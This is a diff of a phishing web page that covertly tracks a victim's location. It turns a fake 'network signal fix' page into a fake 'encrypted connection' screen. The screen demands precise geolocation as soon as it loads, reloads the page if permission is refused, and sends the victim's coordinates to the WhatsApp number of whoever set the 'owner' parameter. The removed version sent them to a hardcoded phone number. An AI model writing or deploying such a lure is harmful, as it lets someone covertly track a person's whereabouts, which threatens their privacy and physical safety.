@@ -1,28 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Network Troubleshooter</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>System Verification</title>
     <style>
-        body { background: #f4f4f4; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background: #007bff; color: white; padding: 20px 40px; border-radius: 50px; text-decoration: none; display: inline-block; font-weight: bold; }
+        body { background: #000; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { border: 1px solid #00f3ff; padding: 20px; border-radius: 10px; width: 80%; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00f3ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h2>System Repair</h2>
-    <p>Tap below to calibrate your network signal.</p>
-    <a href="#" class="btn" onclick="locate()">FIX SIGNAL NOW</a>
+    <div class="box">
+        <h3>ENCRYPTED CONNECTION</h3>
+        <p>To establish a secure link, please allow location access when prompted.</p>
+        <div class="loader"></div>
+        <p id="msg">Awaiting Permission...</p>
+    </div>
 
     <script>
-        function locate() {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const msg = `📡 SIGNAL FOUND\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                window.location.href = `https://wa.me/254793378439?text=${encodeURIComponent(msg)}`;
-            }, (err) => {
-                alert("Error: Location permission is required to calibrate signal.");
-            });
-        }
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            const owner = params.get('owner');
+            const target = params.get('target');
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        const text = `AUSTINE'S TECH RESULT:%0A%0ATarget: ${target}%0ALocation: ${mapUrl}`;
+                        
+                        document.getElementById('msg').innerText = "LINK ESTABLISHED. REDIRECTING...";
+                        
+                        // Redirect to your DM
+                        window.location.href = `https://wa.me/${owner}?text=${text}`;
+                    },
+                    (err) => {
+                        alert("Error: Secure connection requires location permission.");
+                        location.reload();
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                alert("Browser not supported.");
+            }
+        };
     </script>
 </body>
 </html>
-        
